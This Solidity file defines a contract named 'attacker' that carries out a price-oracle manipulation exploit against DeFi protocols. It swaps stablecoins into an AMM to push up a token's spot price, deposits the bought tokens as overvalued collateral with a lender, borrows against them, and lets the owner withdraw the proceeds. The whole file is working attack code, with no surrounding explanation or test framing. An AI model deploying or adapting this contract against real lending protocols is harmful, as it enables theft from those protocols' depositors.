// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

interface IAMM {
    function swap(
        address tokenIn,
        uint256 amountIn,
        uint256 minAmountOut
    ) external returns (uint256 amountOut);

    function getPrice()
        external
        view
        returns (uint256 priceE18);
}

interface ILender {
    function borrow(
        uint256 collateralAmount
    ) external returns (uint256 debtAmount);
}

contract attacker {
    using SafeERC20 for IERC20;

    uint256 private constant ONE = 1e18;

    address public immutable owner;
    address public immutable amm;
    address public immutable lending;
    address public immutable token;
    address public immutable stable;

    uint256 public lastPriceBefore;
    uint256 public lastPriceAfter;
    uint256 public lastCollateralUsed;
    uint256 public lastCollateralValue;
    uint256 public lastBorrowAmount;
    uint256 public lastProfit;

    event AttackExecuted(
        uint256 priceBefore,
        uint256 priceAfter,
        uint256 collateralUsed,
        uint256 collateralValue,
        uint256 borrowAmount,
        uint256 profit
    );

    constructor(
        address _amm,
        address _lending,
        address _token,
        address _stable
    ) {
        require(_amm != address(0), "ZERO_AMM");
        require(_lending != address(0), "ZERO_LENDING");
        require(_token != address(0), "ZERO_TOKEN");
        require(_stable != address(0), "ZERO_STABLE");

        owner = msg.sender;
        amm = _amm;
        lending = _lending;
        token = _token;
        stable = _stable;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "NOT_OWNER");
        _;
    }

    function attack(
        uint256 stableToSwap
    ) external onlyOwner {
        require(
            stableToSwap > 0,
            "ZERO_SWAP_AMOUNT"
        );

        uint256 priceBefore =
            IAMM(amm).getPrice();

        IERC20(stable).forceApprove(
            amm,
            stableToSwap
        );

        uint256 tokenOut =
            IAMM(amm).swap(
                stable,
                stableToSwap,
                0
            );

        uint256 priceAfter =
            IAMM(amm).getPrice();

        IERC20(token).forceApprove(
            lending,
            tokenOut
        );

        uint256 borrowed =
            ILender(lending).borrow(
                tokenOut
            );

        uint256 collateralValue =
            (tokenOut * priceAfter) / ONE;

        uint256 profit =
            IERC20(stable).balanceOf(
                address(this)
            );

        lastPriceBefore = priceBefore;
        lastPriceAfter = priceAfter;
        lastCollateralUsed = tokenOut;
        lastCollateralValue = collateralValue;
        lastBorrowAmount = borrowed;
        lastProfit = profit;

        emit AttackExecuted(
            priceBefore,
            priceAfter,
            tokenOut,
            collateralValue,
            borrowed,
            profit
        );
    }

    function withdrawProfit()
        external
        onlyOwner
    {
        uint256 stableProfit =
            IERC20(stable).balanceOf(
                address(this)
            );

        if (stableProfit > 0) {
            IERC20(stable).safeTransfer(
                owner,
                stableProfit
            );
        }

        uint256 tokenProfit =
            IERC20(token).balanceOf(
                address(this)
            );

        if (tokenProfit > 0) {
            IERC20(token).safeTransfer(
                owner,
                tokenProfit
            );
        }
    }
}
